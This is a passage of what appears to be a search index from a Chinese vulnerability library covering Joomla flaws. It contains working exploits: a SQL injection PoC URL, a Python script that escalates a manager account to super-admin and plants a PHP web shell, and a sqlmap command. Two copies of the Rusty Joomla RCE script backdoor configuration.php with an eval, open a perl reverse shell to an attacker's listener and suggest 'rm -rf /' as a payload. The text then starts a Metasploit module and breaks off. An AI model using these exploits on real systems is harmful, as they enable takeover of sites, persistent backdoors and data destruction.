</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2017-8917%29Joomla_3.7.0_SQL%E6%B3%A8%E5%85%A5/","title":"Joomla! 3.7.0 SQL\u6ce8\u5165(CVE-2017-8917)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2017-8917%29Joomla_3.7.0_SQL%E6%B3%A8%E5%85%A5/#official","title":"Official","text":"<p>https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html</p> <p>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2017-8917%29Joomla_3.7.0_SQL%E6%B3%A8%E5%85%A5/#affected-version","title":"Affected Version","text":"<p>Joomla! 3.7.0</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2017-8917%29Joomla_3.7.0_SQL%E6%B3%A8%E5%85%A5/#poc","title":"PoC","text":"<p>\u76f4\u63a5\u8bbf\u95ee,\u7206\u51fa\u6570\u636e\u5e93\u7528\u6237\u540d\uff1a</p> <pre><code>http://foo.com/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2017-8917%29Joomla_3.7.0_SQL%E6%B3%A8%E5%85%A5/#references","title":"References","text":"<ol> <li>http://blog.nsfocus.net/joomla-3-7-0-sql-injection-vulnerability/</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2020-11890%29JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"JoomlaRCE\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08CVE-2020-11890\uff09","text":"<p>\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 16:18:31</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2020-11890%29JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","title":"\u7b80\u4ecb","text":"<p>Joomla! CMS versions 2.5.0 \u2013 3.9.16\u7248\u672c\u5728\u5904\u7406\u7528\u6237\u7ec4\u65f6\u7f3a\u5c11\u5bf9\u6839\u7528\u6237\u7ec4\u7684\u68c0\u67e5\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u4e00\u4e2a\u63d0\u6743\u6f0f\u6d1e\u7684\u4ea7\u751f(CVE-2020-11890)\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2020-11890%29JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>CMS versions 2.5.0 - 3.9.16</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2020-11890%29JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","title":"POC","text":"<p>\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1iDkl9dnCjIEXCJ1QvMLEeQ \u63d0\u53d6\u7801\uff1awhu7</p> <pre><code>py -2 1.py -url http://192.168.2.109/cms/ -u admin -p admin\n</code></pre> <p> \u7ed9\u51fa\u4e86shell\u5730\u5740 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2020-11890%29JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_3","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u5347\u7ea7\u5230\u6700\u65b0\u7248</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla%20%E6%8E%88%E6%9D%83%20RCE%E6%BC%8F%E6%B4%9E%20%EF%BC%88CVE-2020-11890%20CVE-2020-10238%20CVE-2020-10239%EF%BC%89/","title":"Joomla \u6388\u6743 RCE\u6f0f\u6d1e \uff08CVE 2020 11890 CVE 2020 10238 CVE 2020 10239\uff09","text":"<pre><code>#!/usr/bin/python\n#CVE-2020-10239\nimport sys\nimport requests\nimport re\nimport argparse\nimport random\n\n\ndef extract_token(resp):\n    match = re.search(r'name=\"([a-f0-9]{32})\" value=\"1\"', resp.text, re.S)\n    if match is None:\n        print(\"[-] Cannot find CSRF token!\\n\")\n        return None\n    return match.group(1)\n\n\ndef try_admin_login(sess, url, uname, upass):\n    admin_url = url + '/administrator/index.php'\n    print('[+] Getting token for Manager login')\n    resp = sess.get(admin_url, verify=True)\n    token = extract_token(resp)\n    if not token:\n        return False\n    print('[+] Logging in to Manager')\n    data = {\n        'username': uname,\n        'passwd': upass,\n        'task': 'login',\n        token: '1'\n    }\n    resp = sess.post(admin_url, data=data, verify=True)\n    if 'task=profile.edit' not in resp.text:\n        print('[!] Manager Login Failure!')\n        return None\n    print('[+] Manager Login Successfully!')\n    return True\n\n\ndef check_admin(sess, url):\n    url_check = url + '/administrator/index.php?option=com_content'\n    resp = sess.get(url_check, verify=True)\n    token = extract_token(resp)\n    if not token:\n        print \"[-] You are not Manager!\"\n        sys.exit()\n    return token\n\n\ndef getManagerId(url, sess):\n    url_get = url + '/administrator/index.php?option=com_admin&amp;view=profile&amp;layout=edit'\n    resp = sess.get(url_get, verify=True)\n    # get id\n    return re.findall('id=\\d+', resp.text)\n\ndef createNewField(url, sess,token):\n    data = {\n        'jform[title]': 'SQL query',\n        'jform[type]': 'text',\n        'jform[name]': 'SQL query',\n        'jform[label]': 'SQL query',\n        'jform[description]': 'SQL query',\n        'jform[required]': 1,\n        'jform[state]': 1,\n        'jform[group_id]': 0,\n        'jform[access]': 1,\n        'jform[language]': '*',\n        'jform[params][showlabel]': 1,\n        'jform[params][display]': 2,\n        'jform[params][display_readonly]': 2,\n        'jform[id]': 0,\n        'jform[context]': 'com_content.article',\n        'task': 'field.apply',\n        token: 1\n    }\n    resp = sess.post(url + \"/administrator/index.php?option=com_fields&amp;context=com_content.article\", data=data, verify=True)\n    id = re.findall('id=\\d+', resp.text)\n    id_account = getManagerId(url, sess)\n    ran = '%d' % random.randrange(1, 10000)\n    url_post = url + '/administrator/index.php?option=com_fields&amp;context=com_content.article&amp;layout=edit&amp;' + id[0]\n    newdata = {\n        'jform[title]': 'SQL query ' + ran,\n        'jform[type]': 'sql',\n        'jform[name]': 'SQL query ' + ran,\n        'jform[label]': 'SQL query ' + ran,\n        'jform[description]': 'SQL query',\n        'jform[required]': 1,\n        'jform[fieldparams][query]': 'UPDATE #__user_usergroup_map SET group_id = 8 WHERE user_' + id_account[\n            0] + ' AND group_id BETWEEN 6 AND 7; ',\n        'jform[state]': 1,\n        'jform[group_id]': 0,\n        'jform[access]': 1,\n        'jform[language]': '*',\n        'jform[params][showlabel]': 1,\n        'jform[params][display]': 2,\n        'jform[params][display_readonly]': 2,\n        'jform[id]': id,\n        'task': 'field.apply',\n        'jform[context]': 'com_content.article',\n        token: 1\n    }\n    newdata['task'] = 'field.apply'\n    sess.post(url_post, data=newdata, verify=True)\n    # Trigger SQL query\n    url_sql = url + '/administrator/index.php?option=com_content&amp;view=article&amp;layout=edit'\n    sess.get(url_sql, verify=True)\n\n\ndef checkSuperAdmin(url, sess):\n    print(\"[+] Checking Super-admin\")\n    url_config = url + '/administrator/index.php?option=com_config'\n    resp = sess.get(url_config, verify=True)\n    results = re.findall(r'name=\"([^\"]+)\"\\s+[^&gt;]*?value=\"([^\"]+)\"', resp.text, re.S)\n    if not results:\n        print(\"[!] Fail!\" + ' You are not super-admin account')\n        return False\n    else:\n        print \"[+] Done!\"\n        return True\n\n\ndef rce(sess, url, cmd, token):\n    filename = 'error.php'\n    shlink = url + '/administrator/index.php?option=com_templates&amp;view=template&amp;id=506&amp;file=506&amp;file=L2Vycm9yLnBocA%3D%3D'\n    shdata_up = {\n        'jform[source]': \"&lt;?php echo 'Hacked by HK\\n' ;system($_GET['cmd']); ?&gt;\",\n        'task': 'template.apply',\n        token: '1',\n        'jform[extension_id]': '506',\n        'jform[filename]': '/' + filename\n    }\n    sess.post(shlink, data=shdata_up)\n    path2shell = '/templates/protostar/error.php?cmd=' + cmd\n    # print '[+] Shell is ready to use: ' + str(path2shell)\n    print '[+] Checking:'\n    shreq = sess.get(url + path2shell)\n    shresp = shreq.text\n    print shresp + '[+] Shell link: \\n' + (url + path2shell)\n    print '[+] Module finished.'\n\ndef main():\n    # Construct the argument parser\n    ap = argparse.ArgumentParser()\n    # Add the arguments to the parser\n    ap.add_argument(\"-url\", \"--url\", required=True,\n                    help=\" URL for your Joomla target\")\n    ap.add_argument(\"-u\", \"--username\", required=True,\n                    help=\"username\")\n    ap.add_argument(\"-p\", \"--password\", required=True,\n                    help=\"password\")\n    ap.add_argument(\"-cmd\", \"--command\", default=\"whoami\",\n                    help=\"command\")\n    args = vars(ap.parse_args())\n    # target\n    url = format(str(args['url']))\n    print '[+] Your target: ' + url\n    # username\n    uname = format(str(args['username']))\n    # password\n    upass = format(str(args['password']))\n    # command\n    command = format(str(args['command']))\n    # session\n    sess = requests.Session()\n    if not try_admin_login(sess, url, uname, upass): sys.exit()\n    token = check_admin(sess, url)\n    # trigger SQL query\n    createNewField(url, sess,token)\n    # Now you are Super-admin\n    if (checkSuperAdmin(url, sess)):\n        # call RCE\n        rce(sess, url, command, token)\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla%21%20paGO%20Commerce%202.5.9.0%20%E5%AD%98%E5%9C%A8SQL%20%E6%B3%A8%E2%BC%8A/","title":"Joomla! paGO Commerce 2.5.9.0 \u5b58\u5728SQL \u6ce8\u2f0a","text":"<pre><code> POST /joomla/administrator/index.php?option=com_pago&amp;view=comments HTTP/1.1\n2 Host: localhost\n3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\n4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n5 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\n6 Accept-Encoding: gzip, deflate\n7 Content-Type: application/x-www-form-urlencoded\n8 Content-Length: 163\n9 Origin: http://localhost\n10 Connection: close\n11 Referer: http://localhost/joomla/administrator/index.php?option=com_pago&amp;view=comments\n12 Cookie: 4bde113dfc9bf88a13de3b5b9eabe495=sp6rp5mqnihh2i323r57cvesoe; crisp-client%2Fsession%2F0\n13 Upgrade-Insecure-Requests: 1\n14\n15 filter_search=&amp;limit=10&amp;filter_published=1&amp;task=&amp;controller=comments&amp;boxchecked=0&amp;filter_order= \n\u200b```POC```\n sqlmap -r pago --dbs --risk=3 --level=5 --random-agent -p filter_published \n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla-3.4.6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"Joomla 3.4.6 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla-3.4.6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#joomla-346-rce","title":"Joomla-3.4.6-RCE","text":"<p>exp author: twitter:@momika233 from :https://github.com/momika233/Joomla-3.4.6-RCE Software Link: https://downloads.joomla.org/it/cms/joomla3/3-4-6 Version: 3.0.0 \u2192 3.4.6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla-3.4.6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc-1","title":"POC 1","text":"<pre><code>#!/usr/bin/env python3\n\nimport requests\nfrom bs4 import BeautifulSoup\nimport sys\nimport string\nimport random\nimport argparse\nfrom termcolor import colored\n\nPROXS = {'http':'127.0.0.1:8080'}\nPROXS = {}\n\ndef random_string(stringLength):\n        letters = string.ascii_lowercase\n        return ''.join(random.choice(letters) for i in range(stringLength))\n\n\nbackdoor_param = random_string(50)\n\ndef print_info(str):\n        print(colored(\"[*] \" + str,\"cyan\"))\n\ndef print_ok(str):\n        print(colored(\"[+] \"+ str,\"green\"))\n\ndef print_error(str):\n        print(colored(\"[-] \"+ str,\"red\"))\n\ndef print_warning(str):\n        print(colored(\"[!!] \" + str,\"yellow\"))\n\ndef get_token(url, cook):\n        token = ''\n        resp = requests.get(url, cookies=cook, proxies = PROXS)\n        html = BeautifulSoup(resp.text,'html.parser')\n        # csrf token is the last input\n        for v in html.find_all('input'):\n                csrf = v\n        csrf = csrf.get('name')\n        return csrf\n\n\ndef get_error(url, cook):\n        resp = requests.get(url, cookies = cook, proxies = PROXS)\n        if 'Failed to decode session object' in resp.text:\n                #print(resp.text)\n                return False\n        #print(resp.text)\n        return True\n\n\ndef get_cook(url):\n        resp = requests.get(url, proxies=PROXS)\n        #print(resp.cookies)\n        return resp.cookies\n\n\ndef gen_pay(function, command):\n        # Generate the payload for call_user_func('FUNCTION','COMMAND')\n        template = 's:11:\"maonnalezzo\":O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\\\0\\\\0\\\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\\\0\\\\0\\\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:FUNC_LEN:\"FUNC_NAME\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:LENGTH:\"PAYLOAD\";}i:1;s:4:\"init\";}}s:13:\"\\\\0\\\\0\\\\0connection\";i:1;}'\n        #payload =  command + ' || $a=\\'http://wtf\\';'\n        payload =  'http://l4m3rz.l337/;' + command\n        # Following payload will append an eval() at the enabled of the configuration file\n        #payload =  'file_put_contents(\\'configuration.php\\',\\'if(isset($_POST[\\\\\\'test\\\\\\'])) eval($_POST[\\\\\\'test\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';'\n        function_len = len(function)\n        final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))\n        return final\n\ndef make_req(url , object_payload):\n        # just make a req with object\n        print_info('Getting Session Cookie ..')\n        cook = get_cook(url)\n        print_info('Getting CSRF Token ..')\n        csrf = get_token( url, cook)\n\n        user_payload = '\\\\0\\\\0\\\\0' * 9\n        padding = 'AAA' # It will land at this padding\n        working_test_obj = 's:1:\"A\":O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:10:\"phpinfo();\";}'\n        clean_object = 'A\";s:5:\"field\";s:10:\"AAAAABBBBB' # working good without bad effects\n\n        inj_object = '\";'\n        inj_object += object_payload\n        inj_object += 's:6:\"return\";s:102:' # end the object with the 'return' part\n        password_payload = padding + inj_object\n        params = {\n            'username': user_payload,\n            'password': password_payload,\n            'option':'com_users',\n            'task':'user.login',\n            csrf :'1'\n            }\n\n        print_info('Sending request ..')\n        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)\n        return resp.text\n\ndef get_backdoor_pay():\n        # This payload will backdoor the the configuration .PHP with an eval on POST request\n\n        function = 'assert'\n        template = 's:11:\"maonnalezzo\":O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\\\0\\\\0\\\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\\\0\\\\0\\\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:FUNC_LEN:\"FUNC_NAME\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:LENGTH:\"PAYLOAD\";}i:1;s:4:\"init\";}}s:13:\"\\\\0\\\\0\\\\0connection\";i:1;}'\n        # payload =  command + ' || $a=\\'http://wtf\\';'\n        # Following payload will append an eval() at the enabled of the configuration file\n        payload =  'file_put_contents(\\'configuration.php\\',\\'if(isset($_POST[\\\\\\'' + backdoor_param +'\\\\\\'])) eval($_POST[\\\\\\''+backdoor_param+'\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';'\n        function_len = len(function)\n        final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))\n        return final\n\ndef check(url):\n        check_string = random_string(20)\n        target_url = url + 'index.php/component/users'\n        html = make_req(url, gen_pay('print_r',check_string))\n        if check_string in html:\n                return True\n        else:\n                return False\n\ndef ping_backdoor(url,param_name):\n        res = requests.post(url + '/configuration.php', data={param_name:'echo \\'PWNED\\';'}, proxies = PROXS)\n        if 'PWNED' in res.text:\n                return True\n        return False\n\ndef execute_backdoor(url, payload_code):\n        # Execute PHP code from the backdoor\n        res = requests.post(url + '/configuration.php', data={backdoor_param:payload_code}, proxies = PROXS)\n        print(res.text)\n\ndef exploit(url, lhost, lport):\n        # Exploit the target\n        # Default exploitation will append en eval function at the end of the configuration.pphp\n        # as a bacdoor. btq if you do not want this use the funcction get_pay('php_function','parameters')\n        # e.g. get_payload('system','rm -rf /')\n\n        # First check that the backdoor has not been already implanted\n        target_url = url + 'index.php/component/users'\n\n        make_req(target_url, get_backdoor_pay())\n        if ping_backdoor(url, backdoor_param):\n                print_ok('Backdoor implanted, eval your code at ' + url + '/configuration.php in a POST with ' + backdoor_param)\n                print_info('Now it\\'s time to reverse, trying with a system + perl')\n                execute_backdoor(url, 'system(\\'perl -e \\\\\\'use Socket;$i=\"'+ lhost +'\";$p='+ str(lport) +';socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};\\\\\\'\\');')\n\n\nif __name__ == '__main__':\n        parser = argparse.ArgumentParser()\n        parser.add_argument('-t','--target',required=True,help='Joomla Target')\n        parser.add_argument('-c','--check', default=False, action='store_true', required=False,help='Check only')\n        parser.add_argument('-e','--exploit',default=False,action='store_true',help='Check and exploit')\n        parser.add_argument('-l','--lhost', required='--exploit' in sys.argv, help='Listener IP')\n        parser.add_argument('-p','--lport', required='--exploit' in sys.argv, help='Listener port')\n        args = vars(parser.parse_args())\n\n        url = args['target']\n        if(check(url)):\n                print_ok('Vulnerable')\n                if args['exploit']:\n                        exploit(url, args['lhost'], args['lport'])\n                else:\n                        print_info('Use --exploit to exploit it')\n\n        else:\n                print_error('Seems NOT Vulnerable ;/')\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla-3.4.6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc-2-of-rusty_joomla_exploitpy","title":"POC 2 of rusty_joomla_exploit.py","text":"<p>POC 2 and POC 3 from here:https://github.com/kiks7/rusty_joomla_rce thannk yours</p> <pre><code>#!/usr/bin/env python3\n##\n# Exploit Title: Rusty Joomla RCE\n# Google Dork: N/A\n# Date: 02/10/2019\n# Exploit Author: Alessandro Groppo @Hacktive Security\n# Vendor Homepage: https//www.joomla.it/\n# Software Link: https://downloads.joomla.org/it/cms/joomla3/3-4-6\n# Version: 3.0.0 --&gt; 3.4.6\n# Tested on: Linux 4.9.184\n# CVE : [if applicable]\n# Technical details: https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41\n# Github: https://github.com/kiks7/rusty_joomla_rce\n#\n# The exploitation is implanting a backdoor in /configuration.php file in the root directory with an eval in order to be more suitable for all environments.\n# If you don't like this way, you can replace the get_backdoor_pay() with get_pay('php_function', 'parameter') like get_pay('system','rm -rf /')\n#\n#\n#\n#\n##\n\nimport requests\nfrom bs4 import BeautifulSoup\nimport sys\nimport string\nimport random\nimport argparse\nfrom termcolor import colored\n\nPROXS = {'http':'127.0.0.1:8080'}\nPROXS = {}\n\ndef random_string(stringLength):\n    letters = string.ascii_lowercase\n    return ''.join(random.choice(letters) for i in range(stringLength))\n\n\nbackdoor_param = random_string(50)\n\ndef print_info(str):\n    print(colored(\"[*] \" + str,\"cyan\"))\n\ndef print_ok(str):\n    print(colored(\"[+] \"+ str,\"green\"))\n\ndef print_error(str):\n    print(colored(\"[-] \"+ str,\"red\"))\n\ndef print_warning(str):\n    print(colored(\"[!!] \" + str,\"yellow\"))\n\ndef get_token(url, cook):\n    token = ''\n    resp = requests.get(url, cookies=cook, proxies = PROXS)\n    html = BeautifulSoup(resp.text,'html.parser')\n    # csrf token is the last input\n    for v in html.find_all('input'):\n        csrf = v\n    csrf = csrf.get('name')\n    return csrf\n\n\ndef get_error(url, cook):\n    resp = requests.get(url, cookies = cook, proxies = PROXS)\n    if 'Failed to decode session object' in resp.text:\n        #print(resp.text)\n        return False\n    #print(resp.text)\n    return True\n\n\ndef get_cook(url):\n    resp = requests.get(url, proxies=PROXS)\n    #print(resp.cookies)\n    return resp.cookies\n\n\ndef gen_pay(function, command):\n    # Generate the payload for call_user_func('FUNCTION','COMMAND')\n    template = 's:11:\"maonnalezzo\":O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\\\0\\\\0\\\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\\\0\\\\0\\\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:FUNC_LEN:\"FUNC_NAME\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:LENGTH:\"PAYLOAD\";}i:1;s:4:\"init\";}}s:13:\"\\\\0\\\\0\\\\0connection\";i:1;}'\n    #payload =  command + ' || $a=\\'http://wtf\\';'\n    payload =  'http://l4m3rz.l337/;' + command\n    # Following payload will append an eval() at the enabled of the configuration file\n    #payload =  'file_put_contents(\\'configuration.php\\',\\'if(isset($_POST[\\\\\\'test\\\\\\'])) eval($_POST[\\\\\\'test\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';'\n    function_len = len(function)\n    final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))\n    return final\n\ndef make_req(url , object_payload):\n    # just make a req with object\n    print_info('Getting Session Cookie ..')\n    cook = get_cook(url)\n    print_info('Getting CSRF Token ..')\n    csrf = get_token( url, cook)\n\n    user_payload = '\\\\0\\\\0\\\\0' * 9\n    padding = 'AAA' # It will land at this padding\n    working_test_obj = 's:1:\"A\":O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:10:\"phpinfo();\";}'\n    clean_object = 'A\";s:5:\"field\";s:10:\"AAAAABBBBB' # working good without bad effects\n\n    inj_object = '\";'\n    inj_object += object_payload\n    inj_object += 's:6:\"return\";s:102:' # end the object with the 'return' part\n    password_payload = padding + inj_object\n    params = {\n            'username': user_payload,\n            'password': password_payload,\n            'option':'com_users',\n            'task':'user.login',\n            csrf :'1'\n            }\n\n    print_info('Sending request ..')\n    resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)\n    return resp.text\n\ndef get_backdoor_pay():\n    # This payload will backdoor the the configuration .PHP with an eval on POST request\n\n    function = 'assert'\n    template = 's:11:\"maonnalezzo\":O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\\\0\\\\0\\\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\\\0\\\\0\\\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:FUNC_LEN:\"FUNC_NAME\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:LENGTH:\"PAYLOAD\";}i:1;s:4:\"init\";}}s:13:\"\\\\0\\\\0\\\\0connection\";i:1;}'\n    # payload =  command + ' || $a=\\'http://wtf\\';'\n    # Following payload will append an eval() at the enabled of the configuration file\n    payload =  'file_put_contents(\\'configuration.php\\',\\'if(isset($_POST[\\\\\\'' + backdoor_param +'\\\\\\'])) eval($_POST[\\\\\\''+backdoor_param+'\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';'\n    function_len = len(function)\n    final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))\n    return final\n\ndef check(url):\n    check_string = random_string(20)\n    target_url = url + 'index.php/component/users'\n    html = make_req(url, gen_pay('print_r',check_string))\n    if check_string in html:\n        return True\n    else:\n        return False\n\ndef ping_backdoor(url,param_name):\n    res = requests.post(url + '/configuration.php', data={param_name:'echo \\'PWNED\\';'}, proxies = PROXS)\n    if 'PWNED' in res.text:\n        return True\n    return False\n\ndef execute_backdoor(url, payload_code):\n    # Execute PHP code from the backdoor\n    res = requests.post(url + '/configuration.php', data={backdoor_param:payload_code}, proxies = PROXS)\n    print(res.text)\n\ndef exploit(url, lhost, lport):\n    # Exploit the target\n    # Default exploitation will append en eval function at the end of the configuration.pphp\n    # as a bacdoor. btq if you do not want this use the funcction get_pay('php_function','parameters')\n    # e.g. get_payload('system','rm -rf /')\n\n    # First check that the backdoor has not been already implanted\n    target_url = url + 'index.php/component/users'\n\n    make_req(target_url, get_backdoor_pay())\n    if ping_backdoor(url, backdoor_param):\n        print_ok('Backdoor implanted, eval your code at ' + url + '/configuration.php in a POST with ' + backdoor_param)\n        print_info('Now it\\'s time to reverse, trying with a system + perl')\n        execute_backdoor(url, 'system(\\'perl -e \\\\\\'use Socket;$i=\"'+ lhost +'\";$p='+ str(lport) +';socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};\\\\\\'\\');')\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-t','--target',required=True,help='Joomla Target')\n    parser.add_argument('-c','--check', default=False, action='store_true', required=False,help='Check only')\n    parser.add_argument('-e','--exploit',default=False,action='store_true',help='Check and exploit')\n    parser.add_argument('-l','--lhost', required='--exploit' in sys.argv, help='Listener IP')\n    parser.add_argument('-p','--lport', required='--exploit' in sys.argv, help='Listener port')\n    args = vars(parser.parse_args())\n\n    url = args['target']\n    if(check(url)):\n        print_ok('Vulnerable')\n        if args['exploit']:\n            exploit(url, args['lhost'], args['lport'])\n        else:\n            print_info('Use --exploit to exploit it')\n\n    else:\n        print_error('Seems NOT Vulnerable ;/')\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla-3.4.6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc-3-of-msf","title":"POC 3 of MSF","text":"<p>file name:metasploit_rusty_joomla_rce.rb</p> <pre><code>##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule &lt; Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Joomla\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           =&gt; 'Rusty Joomla Unauthenticated Remote Code Execution',\n      'Description'    =&gt; %q{\n    PHP Object Injection because of a downsize in the read/write process with the database leads to RCE.\n    The exploit will backdoor the configuration.php file in the root directory with en eval of a POST parameter.\n    That's because the exploit is more reliabale (doesn't rely on common disabled function). \n    For this reason, use it with caution and remember the house cleaning.\n    Btw, you can also edit this exploit and use whatever payload you want. just modify the exploit object with \n    get_payload('you_php_function','your_parameters'), e.g. get_payload('system','rm -rf /') and enjoy\n      },\n      'Author'  =&gt;\n        [\n          'Alessandro \\'kiks\\' Groppo @Hacktive Security', \n        ],\n      'License'        =&gt; MSF_LICENSE,\n      'References'     =&gt;\n        [\n        ['URL', 'https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41']\n        ],\n      'Privileged'     =&gt; false, \n      'Platform'       =&gt; 'PHP',\n      'Arch'           =&gt; ARCH_PHP,\n      'Targets'        =&gt; [['Joomla 3.0.0 - 